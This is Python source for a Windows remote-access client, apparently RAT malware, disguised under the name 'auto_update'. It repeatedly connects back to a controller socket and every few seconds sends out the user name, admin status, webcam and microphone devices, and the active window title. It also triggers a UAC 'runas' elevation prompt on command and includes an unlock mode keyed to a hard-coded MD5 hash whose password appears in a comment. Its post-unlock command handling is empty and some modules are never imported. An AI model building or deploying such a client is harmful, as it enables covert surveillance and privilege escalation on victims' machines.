# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
import ctypes
import threading

HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False
UNLOCKED = False
SECRET = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
ID = ''
secret_key = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123

destination_directory = 'iDocuments'
client_name = 'auto_update'
client_version = '1.0'
os_type = str(sys.platform)
os_name = str(platform.platform())
os_user = os.path.expanduser('~').split('\\')[-1]

uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

try:
    cam = vidcap.new_Dev(0, 0)
    web_camera_input = str(cam.getdisplayname())
    del cam
except:
    web_camera_input = 'NoDevice'

try:
    p = pyaudio.PyAudio()
    device_name = p.get_default_input_device_info()
    del p
    audio_input = device_name['name']
except (IOError, NameError):
    audio_input = 'NoDevice'

# Init Winapi
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Shell32 = ctypes.windll.shell32
Gdi32 = ctypes.windll.gdi32
Psapi = ctypes.windll.psapi


def check_info():
    return {
        'os_type':          os_type,
        'os':               os_name,
        'protection':       str(UNLOCKED),
        'user':             os_user,
        'privileges':       str(Shell32.IsUserAnAdmin()),
        'audio_device':     audio_input,
        'webcamera_device': web_camera_input,
        'window_title':     get_window_title(),
        'key':              ID,
    }


def get_key():
    if os.path.exists('info.nfo'):
        key_output = open('info.nfo', 'r').read()
        return key_output
    else:
        return ''


def set_key(key):
    global ID
    key_input_file = open('info.nfo', 'w')
    key_input_file.write(key)
    key_input_file.close()
    ID = key
    return


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


def data_receive(sock, end='[ENDOFMESSAGE]'):
    received_data = ''
    try:
        payload = sock.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith(end):
                received_data = received_data[:-len(end)].decode('utf-8')
                break
            else:
                payload = sock.recv(1024)
                continue
        return ast.literal_eval(received_data)
    except socket.error:
        return {'payload': '', 'mode': '', 'frome': '', 'to': ''}


# Send Data Function
def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
    message = {
        'payload': message,
        'mode': mode,
        'from': 'client',
        'session_id': session_id,
    }
    sock.sendall(str(message)+end)


def uac_escalation(argv=None, debug=False):
    if argv is None and Shell32.IsUserAnAdmin():
        return True
    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    ret = Shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


def send_info(sock):
    global ACTIVE
    while ACTIVE:
        data_send(sock, check_info(), 'infoChecker')
        time.sleep(5)


def reactor():
    global ACTIVE
    global UNLOCKED
    global ID

    while 1:
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((HOST, PORT))
            ACTIVE = True
        except:
            time.sleep(5)
            continue

        while ACTIVE:
            try:

                # Begin Init
                data = data_receive(server_socket)
                if data['payload'] == 'connectSuccess':
                    key = get_key()
                    if len(key) != 0:
                        ID = key
                        data_send(server_socket, key, 'clientInitializing')
                    else:
                        data_send(server_socket, 'noKey', 'clientInitializing')
                        new_key = data_receive(server_socket)
                        set_key(new_key['payload'])
                        ID = new_key

                    info_sernder_thread = threading.Thread(target=send_info, args=(server_socket,))
                    info_sernder_thread.start()

                    # After Initialized
                    while ACTIVE:
                        try:
                            data = data_receive(server_socket)
                        except socket.error:
                            break

                        # Run As Administrator Privileges
                        if data['payload'] == 'runAsAdmin':
                            uac_escalation()

                        elif data['payload'].startswith('unlockClient '):
                            pass_key = data['payload'].split()[-1]
                            if pass_key == SECRET:
                                UNLOCKED = True

                                data_send(server_socket, 'loginSuccess', 'loginSuccess', session_id=data['session_id'])

                                while UNLOCKED:

                                    try:
                                        data = data_receive(server_socket)
                                    except socket.error:
                                        break

                            else:
                                data_send(server_socket, 'notAuthorized', 'notAuthorized')


                        else:
                            data_send(server_socket, 'notAuthorized', 'notAuthorized')
                            continue

            except socket.error:
                server_socket.close()
                time.sleep(10)
                break

reactor()
